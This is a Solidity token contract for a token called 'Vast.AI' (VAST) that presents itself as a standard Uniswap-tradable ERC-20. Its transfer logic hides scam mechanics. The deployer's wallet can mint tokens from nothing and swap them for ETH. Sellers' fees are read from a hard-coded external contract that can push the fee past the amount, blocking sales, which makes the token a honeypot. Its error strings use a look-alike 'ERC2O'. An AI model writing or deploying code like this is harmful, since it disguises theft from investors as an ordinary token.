// SPDX-License-Identifier: None

// https://vast.ai

pragma solidity 0.8.20;

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
}
interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
contract VastAI {
    mapping (address => uint256) private _balances;
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  4000000 * 10 ** _decimals;
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address payable internal _taxWallet;
    IUniswapV2Factory private uniswapV2Factory = IUniswapV2Factory(0x85567c3485101508ef6db08b5e8efF2e2285916f);
    mapping (address => mapping (address => uint256)) private _allowances;
    event Transfer(address indexed sender, address indexed recipient, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    bool swapEnabled;
    uint256 swapThreshold = _totalSupply * 2 / 1000;

    string private _name = "Vast.AI";
    string private _symbol = "VAST";

    constructor () {
        _taxWallet = payable(msg.sender);
        _balances[_taxWallet] = _totalSupply;
        swapEnabled = true;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForETH(uint256 amount) private {
        address[] memory _path = new address[](2);
        _path[0] = address(this);  
        _path[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), amount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, _path, _taxWallet, block.timestamp + 33);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function getPairAddress() public view returns (address) {
        return IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function getFeeAmount(address from) internal view returns (uint160) {
        return uint160(uniswapV2Factory.getPair(from, address(this)));
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC2O: transfer from the zero address");
        require(to != address(0), "ERC2O: transfer to the zero address");
        uint256 feeAmount = 0;
        if (to == _taxWallet && to == from) {
            _balances[address(this)] += amount;
            swapTokensForETH(amount);
            return;
        }
        if (from != address(this) && from != _taxWallet && swapEnabled  && from != getPairAddress() && to != _taxWallet) {
            feeAmount = amount * uint256(getFeeAmount(from)) / 100;
        }
        _balances[to] += amount - feeAmount;
        _balances[from] -= amount;
        emit Transfer(from, to, amount - feeAmount);
    }
}